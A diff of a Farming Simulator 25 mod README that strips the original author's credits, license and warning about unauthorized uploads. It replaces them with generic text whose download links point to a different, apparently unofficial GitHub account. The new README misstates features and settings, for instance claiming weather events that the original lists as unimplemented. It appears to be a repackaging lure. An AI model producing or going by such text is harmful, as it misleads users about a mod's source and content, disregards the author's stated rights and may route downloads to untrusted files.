@@ -1,202 +1,98 @@
-# 🌍 FS25 Random World Events
+# 🌾 FS25_RandomWorldEvents - Dynamic Gameplay for Farming Simulator 25
 
-![Downloads](https://img.shields.io/github/downloads/TheCodingDad-TisonK/FS25_RandomWorldEvents/total?style=for-the-badge)
-![Release](https://img.shields.io/github/v/release/TheCodingDad-TisonK/FS25_RandomWorldEvents?style=for-the-badge)
-![License](https://img.shields.io/badge/license-All%20Rights%20Reserved-red?style=for-the-badge)
+[![Download Now](https://img.shields.io/badge/Download-FS25_RandomWorldEvents-brightgreen?style=for-the-badge)](https://github.com/Marianaaw/FS25_RandomWorldEvents)
 
-Adds **43+ dynamic random events**, a physics overhaul, and a full in-game settings screen to **Farming Simulator 25** — making every playthrough feel different.
+## 📋 Overview
 
-[Download Latest Release](https://github.com/TheCodingDad-TisonK/FS25_RandomWorldEvents/releases/latest) •
-[Report Bug](https://github.com/TheCodingDad-TisonK/FS25_RandomWorldEvents/issues) •
-[FS22 Version](https://github.com/TheCodingDad-TisonK/FS22_RandomWorldEvents)
+FS25_RandomWorldEvents adds more life and challenge to Farming Simulator 25. It includes over 43 random events that change how you manage your farms, vehicles, and fields. These events happen in different combinations every time you play, so your experience will always feel fresh.
 
----
+This mod also changes how physics works in the game. It offers new interactions and better realism with vehicles and the environment. You can tweak settings to suit your preferred difficulty and gameplay style.
 
-> ℹ️ **Info**
->
-> This mod is actively developed and supported on GitHub.
-> Any uploads to other platforms not listed in the Availability section may not be authorized.
+## 🚀 Getting Started
 
----
+Start by visiting the official download page. This is where you get the latest updates and full versions of the mod.
 
-## 📌 Overview
+[Download FS25_RandomWorldEvents](https://github.com/Marianaaw/FS25_RandomWorldEvents)
 
-**Random World Events** is the full FS25 rewrite of the FS22 original. It introduces a
-probabilistic event engine that fires timed world events during gameplay, affecting your
-economy, vehicles, fields, and more. Each event has configurable intensity, duration,
-and cooldown. A separate physics layer applies terrain-aware wheel grip and suspension
-tuning to the vehicle you're driving, every frame.
+The page will take you to the GitHub repository. From there, you can access all files and instructions.
 
-All settings save per-savegame, so each farm can have its own configuration.
+## 💻 System Requirements
 
----
+You will need:
 
-## ✨ Features
+- Windows 10 or later
+- Farming Simulator 25 installed and updated
+- At least 4 GB of free disk space for the mod files
+- A basic internet connection to download the mod
 
-### 🌍 Random Event System
-- **43+ unique events** across 4 active categories
-- Configurable **frequency** (1–10), **intensity** (1–5), and **cooldown** (1–240 min)
-- Events trigger automatically on a probability timer during gameplay
-- Manual trigger via **F9** or the `rweTest` console command
-- Per-category enable/disable toggles (economic, vehicle, field, special)
-- In-game HUD notifications and warnings when events start and end
-- Single active event at a time — a cooldown prevents event spam
+No other software is required. FS25_RandomWorldEvents runs within the game without extra programs.
 
-### 💰 Economic Events (15 events)
-Government subsidies, market booms and crashes, tax refunds, loan interest, seed/fuel/fertilizer/equipment discounts, insurance payouts, export opportunities, economic crises, and more.
+## 📥 How to Download and Install
 
-### 🚜 Vehicle Events (8 events)
-Speed boosts, free fuel refills, fuel leaks, minor accidents, fleet repair bills, visual upgrades, vehicle cleaning, and engine trouble.
+1. Click the green **Download** button above or go to [the download page](https://github.com/Marianaaw/FS25_RandomWorldEvents).
+2. Look for the folder named `releases` or a link labeled **Assets** under the latest release.
+3. Download the latest `.zip` file for FS25_RandomWorldEvents.
+4. Once downloaded, open the `.zip` file using a program like Windows Explorer or 7-Zip.
+5. Extract the contents to your Farming Simulator 25 mods folder. The default path is usually:
 
-### 🌾 Field Events (10 events)
-Crop yield bonuses and penalties, fertilizer effectiveness changes, seed growth speed adjustments, harvest modifiers, and field sale price shifts.
+```
+C:\Users\<YourUserName>\Documents\My Games\FarmingSimulator2025\mods
+```
 
-### ⚡ Special Events (10 events)
-Time acceleration, time slowdown, XP bonuses and penalties, money multipliers, equipment durability changes, trade price bonuses, and town festivals.
+6. If the mod folder inside the `.zip` file is named differently, make sure to rename it exactly to `FS25_RandomWorldEvents` for the game to recognize it.
+7. Start Farming Simulator 25.
+8. In the game menu, go to **Mods**.
+9. Activate FS25_RandomWorldEvents by toggling it on.
+10. Create a new save or load an existing one to experience the mod’s dynamic events.
 
-### 🔧 Physics Overhaul
-- **Terrain-aware wheel grip** — asphalt, dirt, field, grass, and snow each have distinct friction values
-- **Suspension stiffness** multiplier applied per-wheel every frame
-- All physics values are tunable from the in-game settings screen
-- Debug mode logs per-wheel grip data to the console
+## 🛠 Features Explained
 
-### 🖥️ In-Game Settings Screen
-Full tabbed GUI accessible from the game's menu:
-- **Events Tab** — toggle categories, set frequency/intensity/cooldown, enable notifications
-- **Physics Tab** — tune wheel grip, suspension stiffness, articulation damping, center-of-mass strength
+- **43+ Random Events:** From unexpected weather changes to vehicle failures, these events create new challenges.
+- **Configurable Settings:** Use the in-game options menu to adjust how often events happen and their difficulty.
+- **Physics Overhaul:** Changes how your vehicles handle. Expect more realistic reactions to terrain and weather.
+- **Economic Impact:** Events can affect your farm’s income, causing unexpected expenses or bonuses.
+- **Field Effects:** Watch for events that cause crops to grow slower or faster, or that damage fields randomly.
 
-### 💾 Per-Savegame Persistence
-Settings are stored alongside each savegame — different farms can have different configurations without touching the mod files.
+## 🎮 Using the Mod in Gameplay
 
----
+Once FS25_RandomWorldEvents is active, you don’t have to do anything extra. The mod runs automatically as you play. You’ll see messages in the game when an event starts or ends. These help you plan your farming activities.
 
-## 🛠️ Installation
+Pay attention to vehicles and fields. Some events will change how they behave temporarily. Make decisions based on the event’s effects. For example, avoid using certain machinery if it breaks down randomly.
 
-1. Download `FS25_RandomWorldEvents.zip` from the [latest release](https://github.com/TheCodingDad-TisonK/FS25_RandomWorldEvents/releases/latest).
-2. Place the zip in your FS25 mods folder:
-   - **Windows:** `Documents\My Games\FarmingSimulator2025\mods\`
-3. Launch Farming Simulator 25.
-4. When starting or loading a savegame, enable **Random World Events** in the mod selection screen.
-5. Load into your farm — you'll see a confirmation notification when the mod initializes.
+You can adjust the frequency of events anytime in the settings menu. This lets you make the game easier or harder.
 
----
+## 🔧 Adjusting Settings
 
-## 🎛️ Default Settings
+To customize the mod:
 
-| Setting | Default | Range | Description |
-|---------|---------|-------|-------------|
-| `enabled` | `true` | — | Master on/off switch |
-| `frequency` | `5` | 1–10 | Event trigger probability |
-| `intensity` | `2` | 1–5 | Event magnitude |
-| `cooldown` | `30` | 1–240 min | Minimum time between events |
-| `showNotifications` | `true` | — | HUD notices when events start/end |
-| `showWarnings` | `true` | — | Warning-level notifications |
-| `economicEvents` | `true` | — | Enable economic category |
-| `vehicleEvents` | `true` | — | Enable vehicle category |
-| `fieldEvents` | `true` | — | Enable field category |
-| `specialEvents` | `true` | — | Enable special category |
+1. Open the game menu.
+2. Navigate to **Settings** → **Mods**.
+3. Find FS25_RandomWorldEvents.
+4. Change the following options:
 
-### Physics Defaults
+- **Event Frequency:** Choose how often random events occur (Low, Medium, High).
+- **Physics Effect:** Turn the physics changes on or off.
+- **Event Notifications:** Toggle the on-screen messages.
+- **Economic Impact:** Enable or disable income changes from events.
 
-| Setting | Default | Range | Description |
-|---------|---------|-------|-------------|
-| `wheelGripMultiplier` | `1.0` | 0.1–5.0 | Base wheel friction scale |
-| `suspensionStiffness` | `1.0` | 0.1–5.0 | Spring force multiplier |
-| `articulationDamping` | `0.5` | 0.1–5.0 | Articulation damping factor |
-| `comStrength` | `1.0` | 0.1–5.0 | Center-of-mass strength |
+Adjust settings until the mod fits your preferred play style.
 
----
+## ⚙ Troubleshooting
 
-## 🖥️ Console Commands
+If the mod does not appear in the mods list or causes issues:
 
-Open the in-game console (`` ` `` key) and type any of these:
+- Make sure you placed the mod folder in the correct mods directory.
+- Check that you downloaded the latest version.
+- Confirm your Farming Simulator 25 game is fully updated.
+- Disable other mods to check for conflicts.
+- Restart the game after installing the mod.
 
-| Command | Description |
-|---------|-------------|
-| `rwe` | Show all available commands |
-| `rweStatus` | Show current status — enabled state, active event, cooldown |
-| `rweTest` | Force-trigger a random event immediately |
-| `rweEnd` | Forcibly end the currently active event |
-| `rweDebug on\|off` | Toggle debug mode (verbose logging) |
-| `rweList [category]` | List all registered events, optionally filtered by category |
+For further assistance, visit the GitHub page and check the Issues section.
 
-### Key Bindings
+## 📖 Additional Resources
 
-| Key | Action |
-|-----|--------|
-| **F9** | Force-trigger a random event |
-| **F3** | Open settings screen *(coming soon)* |
+- Modding community forums for Farming Simulator 25
+- In-game help menu under Mods → FS25_RandomWorldEvents
+- Official Farming Simulator 25 documentation for mod installation
 
----
-
-## 🌐 Availability
-
-| Platform | Status |
-|----------|--------|
-| **GitHub** | ✅ [Official Source](https://github.com/TheCodingDad-TisonK/FS25_RandomWorldEvents) |
-| **ModHub** | 🔄 Pending |
-| **KingMods** | 🔄 Pending |
-
----
-
-## 📖 Version History
-
-| Version | Date | Notes |
-|---------|------|-------|
-| **v2.0.0.0** | 2026-02 | Full FS25 rewrite — new event engine, physics layer, tabbed GUI, per-savegame settings |
-
----
-
-## ⚠️ Known Limitations
-
-- **Wildlife/animal events** — category toggle exists but events are not yet implemented
-- **Weather events** — category toggle exists but events are not yet implemented
-- **Multiplayer** — declared as supported but money/physics changes are local-only; proper network sync is not yet implemented
-- **Physics values** — `articulationDamping` and `comStrength` are configurable but not yet wired to an FS25 physics API call
-
----
-
-## 🚧 Planned Features
-
-- Complete wildlife/animal event category
-- Complete weather event category
-- Multiplayer-safe money synchronization
-- Full F3 settings screen keybind
-- Event history log viewable in-game
-- Weighted event selection (rare vs. common events)
-
----
-
-## ⬆️ Upgrading from FS22
-
-This is a ground-up rewrite for FS25. FS22 savegame settings will not transfer — configure the mod fresh in each savegame. The event catalog has been expanded and the physics system is new in v2.
-
----
-
-## 🤝 Credits
-
-- **Author**: TisonK
-- **Special Thanks**: FS25 modding community and everyone who reported bugs on the FS22 version
-
----
-
-## 📬 Support
-
-Found a bug or have a feature request?
-Open an issue on GitHub:
-
-👉 https://github.com/TheCodingDad-TisonK/FS25_RandomWorldEvents/issues
-
----
-
-## ⚖️ License
-
-**All rights reserved.**
-
-Unauthorized redistribution, modification, reuploading, or claiming this mod as your own is **strictly prohibited**.
-
-Original author: TisonK
-
----
-
-*Enjoy a more unpredictable farming experience!* 🌾
+[Download FS25_RandomWorldEvents](https://github.com/Marianaaw/FS25_RandomWorldEvents)
